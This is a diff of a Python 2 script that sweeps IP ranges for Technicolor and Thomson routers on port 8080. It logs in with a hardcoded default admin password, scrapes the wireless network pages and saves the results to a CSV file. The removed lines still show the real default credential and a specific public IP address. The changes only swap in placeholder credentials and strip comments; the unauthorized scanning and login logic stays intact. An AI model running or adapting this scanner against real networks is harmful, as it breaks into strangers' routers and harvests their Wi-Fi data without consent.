@@ -3,11 +3,11 @@ import requests
 from requests.auth import HTTPBasicAuth
 from bs4 import BeautifulSoup
 import socket
-#para cisco r1=requests.get('http://181.59.220.213:8080/wlanBasic.asp', auth=HTTPBasicAuth('admin', 'Uq-4GIt3M'), timeout=0.4)
+
 
 tech = 0
 tom = 0
-#181.52.82.215
+
 router = open('db.csv','a+')
 for i in range(180,256):
     i = i + 1
@@ -34,11 +34,11 @@ for i in range(180,256):
                         n = r.headers['WWW-Authenticate']
                         if n == techni: ##Technicolor
                             tech = tech+1
-                            r2 = requests.get('http://'+h+':8080/wlanPrimaryNetwork.asp', auth=HTTPBasicAuth('admin', 'Uq-4GIt3M'), timeout=0.4)
+                            r2 = requests.get('http://'+h+':8080/wlanPrimaryNetwork.asp', auth=HTTPBasicAuth('user', 'pass'), timeout=0.4)
                             parser1 = r2.content
-                            #name="ServiceSetIdentifier"
+                            
                             bs1 = BeautifulSoup(parser1, "html.parser")
-                            #for name in bs1.find_all("input", {"name":"ServiceSetIdentifier"}):
+                            
                             for name in bs1.find_all("td", align="middle"):
                                 t = name.text[16:]
                                 ma = t[-19:]
@@ -55,8 +55,6 @@ for i in range(180,256):
                             parser = r4.content
                             bs1 = BeautifulSoup(parser, "html.parser")
                             
-                            #for n in bs1.find_all("input", {"name":"ServiceSetIdentifier"}):
-                               # print n["value"]
                             for name in bs1.find_all("td", align="middle"):
                                 t = name.text[16:]
                                 ma = t[-19:]
@@ -75,12 +73,7 @@ for i in range(180,256):
                     pass
                 except requests.exceptions.ConnectionError:
                     pass
-                #except requests.exceptions.ReadTimeout:
-                    #pass
-                #except requests.exceptions.ConnectionError:
-                    #pass
-                #except requests.exceptions.ConnectTimeout:
-                   # pass
+                
 router.close()
 print str(tech)+" technicolor"
 print str(tom)+" tomson"
